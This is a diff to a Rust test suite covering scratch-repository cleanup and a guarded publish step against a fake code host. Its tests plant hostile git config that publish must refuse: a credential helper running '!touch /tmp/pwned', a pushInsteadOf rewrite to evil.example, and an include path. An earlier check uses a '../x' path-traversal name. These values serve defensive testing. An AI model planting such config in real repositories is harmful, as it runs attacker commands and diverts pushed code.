@@ -124,6 +124,21 @@ fn cleanup_notices_then_leaves_the_chat_with_no_repository() {
     assert!(e.svc.store().repo_mappings(e.ws).unwrap().iter().all(|m| m.repo_id != repo.id), "unbound here");
 }
 
+#[test]
+fn removed_scratch_repos_give_their_workspace_slot_back() {
+    let mut e = env();
+    let chat = e.svc.create_chat("try", e.ws, "anthropic").unwrap();
+    let (s, repo) = create(&mut e.svc, e.ws, Some(chat.id), &e.settings.clone(), &[], "Gone", "laptop").unwrap();
+    let act = scratch::activity(&s, scratch::now());
+    sweep(&mut e.svc, e.ws, &e.settings, "laptop", act + 20 * 86_400);
+    assert!(e.svc.workspace_roster(e.ws).unwrap().repo_live(repo.id), "the background cleanup signs nothing an Admin must confirm");
+    assert_eq!(scratch::retire_pending(e.svc.store(), e.ws).len(), 1);
+    // An Admin's next scratch action retires it.
+    create(&mut e.svc, e.ws, None, &e.settings.clone(), &[], "Next", "laptop").unwrap();
+    assert!(!e.svc.workspace_roster(e.ws).unwrap().repo_live(repo.id));
+    assert!(scratch::retire_pending(e.svc.store(), e.ws).is_empty());
+}
+
 // ── Publish with a fake code host ────────────────────────────────────────
 
 struct Creds(bool);
@@ -241,21 +256,40 @@ async fn publish_needs_the_exact_confirmation_and_pushes_privately() {
     let host = FakeHost { id: ligus_forge::ForgeId::github_com(), creds: Arc::new(Creds(true)), remotes: e.t.path().join("remotes"), created: Mutex::new(vec![]) };
     // No confirmation, or a different one: nothing is created.
     for confirm in ["", "ana/other", "someone/pub"] {
-        assert!(publish(&host, &k.path, "ana", "pub", confirm).await.is_err(), "{confirm}");
+        assert!(publish(&host, &k, "ana", "pub", confirm).await.is_err(), "{confirm}");
     }
-    assert!(publish(&host, &k.path, "ana", "../x", "ana/../x").await.is_err());
+    assert!(publish(&host, &k, "ana", "../x", "ana/../x").await.is_err());
     assert!(host.created.lock().unwrap().is_empty(), "never without consent");
     // Signed out: refused before any call.
     let signed_out = FakeHost { creds: Arc::new(Creds(false)), created: Mutex::new(vec![]), id: host.id.clone(), remotes: host.remotes.clone() };
-    assert!(publish(&signed_out, &k.path, "ana", "pub", "ana/pub").await.is_err());
+    assert!(publish(&signed_out, &k, "ana", "pub", "ana/pub").await.is_err());
     assert!(signed_out.created.lock().unwrap().is_empty());
 
-    let url = publish(&host, &k.path, "ana", "pub", "ana/pub").await.unwrap();
+    // A config an agent could have planted (a helper command, a rewrite):
+    // refused before anything is created.
+    for (key, val) in [("credential.helper", "!touch /tmp/pwned"), ("url.https://evil.example/.pushInsteadOf", "https://github.com/"), ("include.path", "/tmp/x")] {
+        crate::repos::git::git(&k.path, &["config", key, val]).unwrap();
+        let err = publish(&host, &k, "ana", "pub", "ana/pub").await.unwrap_err();
+        assert!(err.contains("git config"), "{key}: {err}");
+        crate::repos::git::git(&k.path, &["config", "--unset", key]).unwrap();
+    }
+    assert!(host.created.lock().unwrap().is_empty());
+
+    // Only from the kept repository itself: a folder inside another
+    // repository (git would find that one) is refused.
+    let other = e.t.path().join("other");
+    std::fs::create_dir_all(other.join("sub")).unwrap();
+    crate::repos::git::git(&other, &["init", "-q"]).unwrap();
+    let moved = ScratchRepo { path: other.join("sub"), ..k.clone() };
+    assert!(publish(&host, &moved, "ana", "pub", "ana/pub").await.unwrap_err().contains("isn't the kept repository"));
+    assert!(host.created.lock().unwrap().is_empty());
+
+    let url = publish(&host, &k, "ana", "pub", "ana/pub").await.unwrap();
     assert_eq!(url, "https://github.com/ana/pub");
     assert_eq!(*host.created.lock().unwrap(), vec![("ana".to_string(), "pub".to_string())]);
     let bare = e.t.path().join("remotes/ana/pub.git");
     assert_eq!(crate::repos::git::git(&bare, &["rev-parse", "main"]).unwrap(), crate::repos::git::git(&k.path, &["rev-parse", "main"]).unwrap());
     // Once it has an origin, it isn't published again.
-    assert!(publish(&host, &k.path, "ana", "pub", "ana/pub").await.is_err());
+    assert!(publish(&host, &k, "ana", "pub", "ana/pub").await.is_err());
     assert_eq!(host.created.lock().unwrap().len(), 1);
 }
